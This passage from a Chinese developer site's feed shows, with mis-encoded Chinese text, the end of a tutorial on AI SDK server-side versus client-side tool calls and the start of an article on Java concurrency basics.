    <span class="hljs-comment">// 2. å®¢æˆ·ç«¯å·¥å…·ï¼šä»…å…ƒä¿¡æ¯ï¼Œæ—  execute</span>
    <span class="hljs-attr">display_diagram</span>: {
      <span class="hljs-attr">description</span>: <span class="hljs-string">"åœ¨draw.ioæ¸²æŸ“å›¾å½¢ï¼ˆå®¢æˆ·ç«¯æ‰§è¡Œï¼‰"</span>,
      <span class="hljs-attr">inputSchema</span>: z.<span class="hljs-title function_">object</span>({
        <span class="hljs-attr">xml</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">describe</span>(<span class="hljs-string">"draw.ioçš„mxCell XMLå­—ç¬¦ä¸²"</span>)
      })
      <span class="hljs-comment">// æ—  execute å‡½æ•°ï¼Œéœ€å‰ç«¯å¤„ç†</span>
    }
  },
  <span class="hljs-attr">experimental_repairToolCall</span>: <span class="hljs-keyword">async</span> ({ toolCall, error }) =&gt; {
    <span class="hljs-comment">// ä¿®å¤æ¨¡å‹è¿”å›çš„å·¥å…·å…¥å‚æ ¼å¼é”™è¯¯ï¼ˆå¦‚æˆªæ–­çš„JSONï¼‰</span>
    <span class="hljs-keyword">if</span> (error.<span class="hljs-property">name</span> === <span class="hljs-string">'InvalidToolInputError'</span>) {
      <span class="hljs-keyword">return</span> { ...toolCall, <span class="hljs-attr">input</span>: <span class="hljs-title function_">jsonrepair</span>(toolCall.<span class="hljs-property">input</span>) };
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  },
  <span class="hljs-attr">onFinish</span>: <span class="hljs-function">(<span class="hljs-params">{ totalUsage }</span>) =&gt;</span> {
    <span class="hljs-comment">// å¯¹è¯ç»“æŸå›è°ƒï¼ˆè®°å½•token/æ—¥å¿—ï¼‰</span>
  }
});

<span class="hljs-comment">// è½¬æ¢ä¸ºå‰ç«¯å¯è¯†åˆ«çš„æµå¼å“åº”</span>
<span class="hljs-keyword">return</span> result.<span class="hljs-title function_">toUIMessageStreamResponse</span>({
  <span class="hljs-attr">sendReasoning</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// è¿”å›æ¨¡å‹æ¨ç†è¿‡ç¨‹</span>
});
</code></pre>
<p><strong>æ³¨è§£</strong>ï¼š</p>
<ul>
<li><code>tools</code> å¯¹è±¡ä¸­ï¼Œæ¯ä¸ªé”®ä¸ºå·¥å…·åç§°ï¼Œå€¼ä¸ºå·¥å…·é…ç½®ï¼›</li>
<li><code>inputSchema</code>ï¼ˆzod æ ¼å¼ï¼‰ç”¨äºæ ¡éªŒæ¨¡å‹ä¼ å…¥çš„å·¥å…·å‚æ•°ï¼›</li>
<li><code>toUIMessageStreamResponse</code> æ˜¯æœåŠ¡ç«¯ä¸å‰ç«¯ <code>useChat</code> é€šä¿¡çš„å…³é”®ï¼Œæ ¼å¼åŒ–æµå¼å“åº”ä¸ºå‰ç«¯å¯è§£æçš„ç»“æ„ï¼ˆåŒ…å« <code>toolCall</code>/<code>text</code> ç­‰å­—æ®µï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-2">3. å‰ç«¯å·¥å…·äº¤äº’ï¼ˆuseChat æ ¸å¿ƒé…ç½®ï¼‰</h3>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// å‰ç«¯ useChat è°ƒç”¨</span>
<span class="hljs-keyword">const</span> { messages, sendMessage, addToolOutput } = <span class="hljs-title function_">useChat</span>({
  <span class="hljs-comment">// é…ç½®ä¼ è¾“å±‚ï¼Œå¯¹æ¥æœåŠ¡ç«¯ /api/chat æ¥å£</span>
  <span class="hljs-attr">transport</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultChatTransport</span>({
    <span class="hljs-attr">api</span>: <span class="hljs-string">'/api/chat'</span>,
  }),
  <span class="hljs-comment">// æ¨¡å‹è§¦å‘å·¥å…·è°ƒç”¨æ—¶çš„å›è°ƒ</span>
  <span class="hljs-attr">onToolCall</span>: <span class="hljs-keyword">async</span> ({ toolCall }) =&gt; {
    <span class="hljs-keyword">const</span> { <span class="hljs-attr">id</span>: toolCallId, toolName, <span class="hljs-attr">input</span>: toolInput } = toolCall;
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// åŒºåˆ†å·¥å…·ç±»å‹å¤„ç†</span>
      <span class="hljs-keyword">switch</span> (toolName) {
        <span class="hljs-comment">// å®¢æˆ·ç«¯å·¥å…·ï¼šå‰ç«¯æ‰§è¡Œé€»è¾‘ + æ‰‹åŠ¨å›ä¼ ç»“æœ</span>
        <span class="hljs-keyword">case</span> <span class="hljs-string">'display_diagram'</span>: {
          <span class="hljs-keyword">const</span> { xml } = toolInput <span class="hljs-keyword">as</span> { <span class="hljs-attr">xml</span>: <span class="hljs-built_in">string</span> };
          <span class="hljs-comment">// å‰ç«¯ä¸šåŠ¡é€»è¾‘ï¼ˆå¦‚è°ƒç”¨draw.io APIæ¸²æŸ“å›¾å½¢ï¼‰</span>
          <span class="hljs-keyword">await</span> <span class="hljs-title function_">renderDiagram</span>(xml);
          
          <span class="hljs-comment">// æ‰‹åŠ¨å›ä¼ ç»“æœç»™æ¨¡å‹</span>
          <span class="hljs-title function_">addToolOutput</span>({
            <span class="hljs-attr">toolCallId</span>: toolCallId, <span class="hljs-comment">// å¿…é¡»åŒ¹é…æ¨¡å‹è¿”å›çš„IDï¼ˆå…³é”®ï¼‰</span>
            <span class="hljs-attr">toolName</span>: toolName,
            <span class="hljs-attr">output</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-comment">// ç»“æœéœ€åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²</span>
              <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>,
              <span class="hljs-attr">message</span>: <span class="hljs-string">'å›¾å½¢æ¸²æŸ“æˆåŠŸ'</span>
            })
          });
          <span class="hljs-keyword">break</span>;
        }
        <span class="hljs-comment">// æœåŠ¡ç«¯å·¥å…·ï¼šå‰ç«¯æ— éœ€å¤„ç†ï¼Œç­‰å¾…æœåŠ¡ç«¯è‡ªåŠ¨æ‰§è¡Œ</span>
        <span class="hljs-keyword">case</span> <span class="hljs-string">'get_shape_library'</span>: {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç­‰å¾…æœåŠ¡ç«¯è¿”å›å½¢çŠ¶åº“ç»“æœ'</span>);
          <span class="hljs-keyword">break</span>;
        }
        <span class="hljs-attr">default</span>:
          <span class="hljs-comment">// æœªçŸ¥å·¥å…·è¿”å›é”™è¯¯</span>
          <span class="hljs-title function_">addToolOutput</span>({
            toolCallId,
            toolName,
            <span class="hljs-attr">output</span>: <span class="hljs-string">''</span>,
            <span class="hljs-attr">error</span>: <span class="hljs-string">`æœªçŸ¥å·¥å…·ï¼š<span class="hljs-subst">${toolName}</span>`</span>
          });
      }
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-comment">// å·¥å…·æ‰§è¡Œå¤±è´¥ï¼Œå›ä¼ é”™è¯¯ä¿¡æ¯</span>
      <span class="hljs-title function_">addToolOutput</span>({
        toolCallId,
        toolName,
        <span class="hljs-attr">output</span>: <span class="hljs-string">''</span>,
        <span class="hljs-attr">error</span>: (error <span class="hljs-keyword">as</span> <span class="hljs-title class_">Error</span>).<span class="hljs-property">message</span>
      });
    }
  },
  <span class="hljs-comment">// å·¥å…·ç»“æœå›ä¼ åè‡ªåŠ¨è§¦å‘æ¨¡å‹ç»§ç»­å›å¤</span>
  <span class="hljs-attr">sendAutomaticallyWhen</span>: <span class="hljs-function">(<span class="hljs-params">{ messages }</span>) =&gt;</span> <span class="hljs-literal">true</span>,
  <span class="hljs-attr">onError</span>: <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'èŠå¤©é”™è¯¯ï¼š'</span>, error)
});
</code></pre>
<p><strong>æ³¨è§£</strong>ï¼š</p>
<ul>
<li><code>DefaultChatTransport</code>ï¼šå°è£…å‰ç«¯ä¸æœåŠ¡ç«¯çš„é€šä¿¡é€»è¾‘ï¼Œè‡ªåŠ¨è§£ææœåŠ¡ç«¯è¿”å›çš„æµå¼å“åº”ï¼›</li>
<li><code>onToolCall</code>ï¼šå‰ç«¯æ•è·æ¨¡å‹å·¥å…·è°ƒç”¨æŒ‡ä»¤çš„å”¯ä¸€å…¥å£ï¼›</li>
<li><code>addToolOutput</code>ï¼šå®¢æˆ·ç«¯å·¥å…·ç»“æœå›ä¼ çš„æ ¸å¿ƒæ–¹æ³•ï¼Œ<code>toolCallId</code> å¿…é¡»ä¸æ¨¡å‹è¿”å›çš„ ID ä¸€è‡´ï¼ˆå¦åˆ™æ¨¡å‹æ— æ³•å…³è”ç»“æœï¼‰ï¼›</li>
<li><code>sendAutomaticallyWhen: () =&gt; true</code>ï¼šç¡®ä¿å·¥å…·ç»“æœå›ä¼ åï¼Œæ¨¡å‹è‡ªåŠ¨ç”Ÿæˆæœ€ç»ˆå›å¤ï¼Œå®Œæˆé—­ç¯ã€‚</li>
</ul>
<h2 data-id="heading-3">äºŒã€æœåŠ¡ç«¯å·¥å…· vs å®¢æˆ·ç«¯å·¥å…·ï¼šäº¤äº’æ ¸å¿ƒåŒºåˆ«</h2>













































<table><thead><tr><th>ç»´åº¦</th><th>æœåŠ¡ç«¯å·¥å…·ï¼ˆå¸¦ executeï¼‰</th><th>å®¢æˆ·ç«¯å·¥å…·ï¼ˆæ—  executeï¼‰</th></tr></thead><tbody><tr><td><strong>æ‰§è¡Œä¸»ä½“</strong></td><td>æœåŠ¡ç«¯ï¼ˆNode.jsï¼‰</td><td>å‰ç«¯ï¼ˆæµè§ˆå™¨ / å®¢æˆ·ç«¯ï¼‰</td></tr><tr><td><strong>æ ¸å¿ƒè§¦å‘é€»è¾‘</strong></td><td>AI.js è‡ªåŠ¨è§¦å‘ <code>execute</code> å‡½æ•°</td><td>å‰ç«¯ <code>onToolCall</code> å›è°ƒæ‰‹åŠ¨è§¦å‘</td></tr><tr><td><strong>ç»“æœè¿”å›æ–¹å¼</strong></td><td><code>execute</code> è¿”å›å€¼ç”± AI.js è‡ªåŠ¨å°è£…å¹¶ä¼ ç»™æ¨¡å‹</td><td>å‰ç«¯è°ƒç”¨ <code>addToolOutput</code> æ‰‹åŠ¨å›ä¼ ç»“æœ</td></tr><tr><td><strong>å…³é”®ä¾èµ–</strong></td><td>æœåŠ¡ç«¯ç¯å¢ƒï¼ˆæ–‡ä»¶ / æ•°æ®åº“ / åç«¯ APIï¼‰</td><td>å‰ç«¯ç¯å¢ƒï¼ˆDOM / å®¢æˆ·ç«¯ SDK / æœ¬åœ°å­˜å‚¨ï¼‰</td></tr><tr><td><strong>é€šä¿¡æˆæœ¬</strong></td><td>æ— é¢å¤–ç½‘ç»œè¯·æ±‚ï¼ˆæœåŠ¡ç«¯å†…éƒ¨å®Œæˆï¼‰</td><td>éœ€ 2 æ¬¡ç½‘ç»œè¯·æ±‚ï¼ˆæŒ‡ä»¤ä¸‹å‘ + ç»“æœå›ä¼ ï¼‰</td></tr><tr><td><strong>æ ¸å¿ƒçº¦æŸ</strong></td><td><code>execute</code> éœ€è‡ªè¡Œæ•è·å¼‚å¸¸ï¼Œè¿”å›å‹å¥½æç¤º</td><td><code>toolCallId</code> å¿…é¡»ä¸æ¨¡å‹è¿”å›çš„ ID ä¸¥æ ¼åŒ¹é…</td></tr><tr><td><strong>å…¸å‹åœºæ™¯</strong></td><td>æ•°æ®æŸ¥è¯¢ã€æ–‡ä»¶è¯»å–ã€åç«¯ API è°ƒç”¨</td><td>å‰ç«¯ UI äº¤äº’ã€æœ¬åœ°æ“ä½œã€å®¢æˆ·ç«¯ SDK è°ƒç”¨</td></tr></tbody></table>
<h2 data-id="heading-4">ä¸‰ã€æ ¸å¿ƒæµç¨‹æ¢³ç†</h2>
<h3 data-id="heading-5">1. æœåŠ¡ç«¯å·¥å…·æµç¨‹</h3>
<p>ç”¨æˆ·æŒ‡ä»¤ â†’ æœåŠ¡ç«¯ <code>streamText</code> â†’ æ¨¡å‹è°ƒç”¨æœåŠ¡ç«¯å·¥å…· â†’ AI.js è‡ªåŠ¨æ‰§è¡Œ <code>execute</code> â†’ ç»“æœè‡ªåŠ¨ä¼ ç»™æ¨¡å‹ â†’ æ¨¡å‹ç”Ÿæˆå›å¤ â†’ å‰ç«¯å±•ç¤ºã€‚</p>
<h3 data-id="heading-6">2. å®¢æˆ·ç«¯å·¥å…·æµç¨‹</h3>
<p>ç”¨æˆ·æŒ‡ä»¤ â†’ æœåŠ¡ç«¯ <code>streamText</code> â†’ æ¨¡å‹è°ƒç”¨å®¢æˆ·ç«¯å·¥å…· â†’ æœåŠ¡ç«¯é€šè¿‡æµå¼å“åº”ä¸‹å‘ <code>toolCall</code> æŒ‡ä»¤ â†’ å‰ç«¯ <code>onToolCall</code> è§¦å‘ â†’ æ‰§è¡Œå®¢æˆ·ç«¯é€»è¾‘ â†’ <code>addToolOutput</code> å›ä¼ ç»“æœ â†’ æœåŠ¡ç«¯å°è£…ç»“æœå–‚ç»™æ¨¡å‹ â†’ æ¨¡å‹ç”Ÿæˆå›å¤ â†’ å‰ç«¯å±•ç¤ºã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Javaå¹¶å‘ç¼–ç¨‹åŸºç¡€ä¸è¿›é˜¶ï¼ˆçº¿ç¨‹Â·é”Â·åŸå­ç±»Â·é€šä¿¡ï¼‰]]></title>    <link>https://juejin.cn/post/7592410399918161961</link>    <guid>https://juejin.cn/post/7592410399918161961</guid>    <pubDate>2026-01-08T02:09:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592410399918161961" data-draft-id="7592134330313408555" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Javaå¹¶å‘ç¼–ç¨‹åŸºç¡€ä¸è¿›é˜¶ï¼ˆçº¿ç¨‹Â·é”Â·åŸå­ç±»Â·é€šä¿¡ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•,Android"/> <meta itemprop="datePublished" content="2026-01-08T02:09:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é’è²843"/> <meta itemprop="url" content="https://juejin.cn/user/541408646929991"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Javaå¹¶å‘ç¼–ç¨‹åŸºç¡€ä¸è¿›é˜¶ï¼ˆçº¿ç¨‹Â·é”Â·åŸå­ç±»Â·é€šä¿¡ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/541408646929991/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é’è²843
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:09:20.000Z" title="Thu Jan 08 2026 02:09:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1å°æ—¶+
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç¬¬ä¸€ç«  çº¿ç¨‹åŸºç¡€</h2>
<h3 data-id="heading-1">1.1 è¿›ç¨‹ä¸çº¿ç¨‹çš„æ¦‚å¿µ</h3>
<h4 data-id="heading-2">è¿›ç¨‹çš„å®šä¹‰å’Œç‰¹ç‚¹</h4>
<p>**è¿›ç¨‹ï¼ˆProcessï¼‰**æ˜¯æ“ä½œç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„åŸºæœ¬å•ä½ã€‚æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ï¼ŒåŒ…æ‹¬ä»£ç æ®µã€æ•°æ®æ®µã€å †æ ˆæ®µç­‰ã€‚</p>
<p><strong>è¿›ç¨‹çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>ç‹¬ç«‹æ€§</strong>ï¼šè¿›ç¨‹ä¹‹é—´ç›¸äº’ç‹¬ç«‹ï¼Œä¸€ä¸ªè¿›ç¨‹çš„å´©æºƒä¸ä¼šå½±å“å…¶ä»–è¿›ç¨‹</li>
<li><strong>èµ„æºéš”ç¦»</strong>ï¼šæ¯ä¸ªè¿›ç¨‹æ‹¥æœ‰ç‹¬ç«‹çš„åœ°å€ç©ºé—´ï¼Œè¿›ç¨‹é—´ä¸èƒ½ç›´æ¥è®¿é—®å¯¹æ–¹çš„å†…å­˜</li>
<li><strong>å¼€é”€å¤§</strong>ï¼šè¿›ç¨‹çš„åˆ›å»ºã€åˆ‡æ¢ã€é”€æ¯éƒ½éœ€è¦è¾ƒå¤§çš„ç³»ç»Ÿå¼€é”€</li>
<li><strong>é€šä¿¡å¤æ‚</strong>ï¼šè¿›ç¨‹é—´é€šä¿¡éœ€è¦é€šè¿‡IPCï¼ˆInter-Process Communicationï¼‰æœºåˆ¶ï¼Œå¦‚ç®¡é“ã€ä¿¡å·ã€å…±äº«å†…å­˜ç­‰</li>
</ul>
<h4 data-id="heading-3">çº¿ç¨‹çš„å®šä¹‰å’Œç‰¹ç‚¹</h4>
<p>**çº¿ç¨‹ï¼ˆThreadï¼‰**æ˜¯CPUè°ƒåº¦çš„åŸºæœ¬å•ä½ï¼Œæ˜¯è¿›ç¨‹å†…çš„ä¸€ä¸ªæ‰§è¡Œæµã€‚ä¸€ä¸ªè¿›ç¨‹å¯ä»¥åŒ…å«å¤šä¸ªçº¿ç¨‹ï¼Œè¿™äº›çº¿ç¨‹å…±äº«è¿›ç¨‹çš„å†…å­˜ç©ºé—´å’Œèµ„æºã€‚</p>
<p><strong>çº¿ç¨‹çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>è½»é‡çº§</strong>ï¼šçº¿ç¨‹çš„åˆ›å»ºã€åˆ‡æ¢ã€é”€æ¯å¼€é”€æ¯”è¿›ç¨‹å°å¾—å¤š</li>
<li><strong>å…±äº«èµ„æº</strong>ï¼šåŒä¸€è¿›ç¨‹å†…çš„çº¿ç¨‹å…±äº«è¿›ç¨‹çš„å†…å­˜ç©ºé—´ã€æ–‡ä»¶æè¿°ç¬¦ç­‰èµ„æº</li>
<li><strong>å¹¶å‘æ‰§è¡Œ</strong>ï¼šå¤šä¸ªçº¿ç¨‹å¯ä»¥å¹¶å‘æ‰§è¡Œï¼Œæé«˜ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡</li>
<li><strong>é€šä¿¡ç®€å•</strong>ï¼šçº¿ç¨‹é—´å¯ä»¥ç›´æ¥é€šè¿‡å…±äº«å†…å­˜è¿›è¡Œé€šä¿¡ï¼Œä½†éœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨</li>
</ul>
<h4 data-id="heading-4">è¿›ç¨‹ä¸çº¿ç¨‹çš„åŒºåˆ«</h4>








































<table><thead><tr><th>å¯¹æ¯”é¡¹</th><th>è¿›ç¨‹</th><th>çº¿ç¨‹</th></tr></thead><tbody><tr><td><strong>èµ„æºæ‹¥æœ‰</strong></td><td>æ‹¥æœ‰ç‹¬ç«‹çš„åœ°å€ç©ºé—´å’Œèµ„æº</td><td>å…±äº«è¿›ç¨‹çš„åœ°å€ç©ºé—´å’Œèµ„æº</td></tr><tr><td><strong>åˆ›å»ºå¼€é”€</strong></td><td>å¤§ï¼ˆéœ€è¦åˆ†é…ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ï¼‰</td><td>å°ï¼ˆå…±äº«è¿›ç¨‹èµ„æºï¼‰</td></tr><tr><td><strong>åˆ‡æ¢å¼€é”€</strong></td><td>å¤§ï¼ˆéœ€è¦åˆ‡æ¢åœ°å€ç©ºé—´ï¼‰</td><td>å°ï¼ˆåªéœ€åˆ‡æ¢ä¸Šä¸‹æ–‡ï¼‰</td></tr><tr><td><strong>é€šä¿¡æ–¹å¼</strong></td><td>éœ€è¦IPCæœºåˆ¶ï¼ˆç®¡é“ã€ä¿¡å·ç­‰ï¼‰</td><td>å¯ç›´æ¥é€šè¿‡å…±äº«å†…å­˜é€šä¿¡</td></tr><tr><td><strong>ç‹¬ç«‹æ€§</strong></td><td>å®Œå…¨ç‹¬ç«‹ï¼Œä¸€ä¸ªè¿›ç¨‹å´©æºƒä¸å½±å“å…¶ä»–è¿›ç¨‹</td><td>ç›¸äº’å½±å“ï¼Œä¸€ä¸ªçº¿ç¨‹å´©æºƒå¯èƒ½å¯¼è‡´æ•´ä¸ªè¿›ç¨‹å´©æºƒ</td></tr><tr><td><strong>æ•°é‡</strong></td><td>ç³»ç»Ÿèµ„æºæœ‰é™ï¼Œè¿›ç¨‹æ•°é‡è¾ƒå°‘</td><td>ä¸€ä¸ªè¿›ç¨‹å¯ä»¥åˆ›å»ºå¤§é‡çº¿ç¨‹</td></tr></tbody></table>
<h4 data-id="heading-5">å¤šè¿›ç¨‹ vs å¤šçº¿ç¨‹</h4>
<p><strong>å¤šè¿›ç¨‹çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>æ›´å¥½çš„éš”ç¦»æ€§ï¼Œä¸€ä¸ªè¿›ç¨‹çš„å´©æºƒä¸ä¼šå½±å“å…¶ä»–è¿›ç¨‹</li>
<li>å¯ä»¥åˆ©ç”¨å¤šæ ¸CPUï¼Œå®ç°çœŸæ­£çš„å¹¶è¡Œ</li>
<li>é€‚åˆéœ€è¦é«˜ç¨³å®šæ€§çš„åœºæ™¯</li>
</ul>
<p><strong>å¤šçº¿ç¨‹çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>åˆ›å»ºå’Œåˆ‡æ¢å¼€é”€å°ï¼Œæ€§èƒ½æ›´é«˜</li>
<li>çº¿ç¨‹é—´é€šä¿¡ç®€å•ï¼Œæ•°æ®å…±äº«æ–¹ä¾¿</li>
<li>é€‚åˆéœ€è¦é¢‘ç¹é€šä¿¡å’Œåä½œçš„åœºæ™¯</li>
</ul>
<p><strong>é€‰æ‹©å»ºè®®ï¼š</strong></p>
<ul>
<li>éœ€è¦é«˜éš”ç¦»æ€§ã€é«˜ç¨³å®šæ€§ â†’ é€‰æ‹©å¤šè¿›ç¨‹</li>
<li>éœ€è¦é¢‘ç¹é€šä¿¡ã€å…±äº«æ•°æ® â†’ é€‰æ‹©å¤šçº¿ç¨‹</li>
<li>ç°ä»£åº”ç”¨é€šå¸¸é‡‡ç”¨å¤šçº¿ç¨‹ + è¿›ç¨‹éš”ç¦»çš„æ··åˆæ¨¡å¼</li>
</ul>
<h3 data-id="heading-6">1.2 Javaçº¿ç¨‹çš„åˆ›å»ºæ–¹å¼</h3>
<h4 data-id="heading-7">æ–¹å¼ä¸€ï¼šç»§æ‰¿Threadç±»</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"çº¿ç¨‹æ‰§è¡Œ: "</span> + Thread.currentThread().getName());
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">MyThread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>();
        thread.start(); <span class="hljs-comment">// å¯åŠ¨çº¿ç¨‹</span>
    }
}
